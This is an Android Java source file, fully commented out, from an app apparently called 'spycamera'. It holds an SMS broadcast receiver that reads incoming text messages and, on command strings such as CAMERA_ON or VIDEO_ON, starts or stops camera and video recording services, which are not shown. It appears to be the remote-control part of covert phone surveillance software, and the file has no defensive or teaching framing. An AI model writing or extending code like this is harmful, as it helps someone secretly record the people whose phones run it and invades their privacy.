//package com.example.spycamera.ReceiveMessagesServices;
//
//import android.app.ActivityManager;
//import android.content.BroadcastReceiver;
//import android.content.Context;
//import android.content.Intent;
//import android.os.Bundle;
//import android.telephony.SmsMessage;
//
//import com.example.spycamera.Activities.CameraService;
//import com.example.spycamera.Activities.VideoService;
//import com.example.spycamera.Utilities.Constants;
//
//public class SMSBroadCastReceiver extends BroadcastReceiver {
//    private static final String pdu_type = "pdus";
//
//    private Context context;
//
//    @Override
//    public void onReceive(Context context, Intent intent) {
//        if (context == null || intent == null) {
//            return;
//        }
//        this.context = context;
//        Bundle bundle = intent.getExtras();
//        if (bundle != null) {
//            readSMS(bundle);
//        }
//    }
//
//    private void readSMS(Bundle bundle) {
//        Object[] pduArray = (Object[]) bundle.get(pdu_type);
//        final SmsMessage[] messages = new SmsMessage[pduArray.length];
//        for (int i = 0; i < pduArray.length; i++) {
//            messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
//            String message = messages[i].getMessageBody() + messages[i].getDisplayMessageBody();
//            processSMS(message);
//        }
//    }
//
//    private void processSMS(String message) {
//        try {
//            switch (message.toUpperCase()) {
//                case Constants.CAMERA_ON:
//                    stopServiceForcefully();
//                    context.startService(new Intent(context, CameraService.class));
//                    break;
//                case Constants.VIDEO_ON:
//                    stopServiceForcefully();
//                    context.startService(new Intent(context, VideoService.class));
//                    break;
//                case Constants.CAMERA_OFF:
//                case Constants.VIDEO_OFF:
//                    stopServiceForcefully();
//                    break;
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//
//    private void stopServiceForcefully() {
//        if (isMyServiceRunning(VideoService.class)) {
//            context.stopService(new Intent(context, VideoService.class));
//        }
//        if (isMyServiceRunning(CameraService.class)) {
//            context.stopService(new Intent(context, CameraService.class));
//        }
//    }
//
//    private boolean isMyServiceRunning(Class<?> serviceClass) {
//        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
//        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
//            if (serviceClass.getName().equals(service.service.getClassName())) {
//                return true;
//            }
//        }
//        return false;
//    }
//}
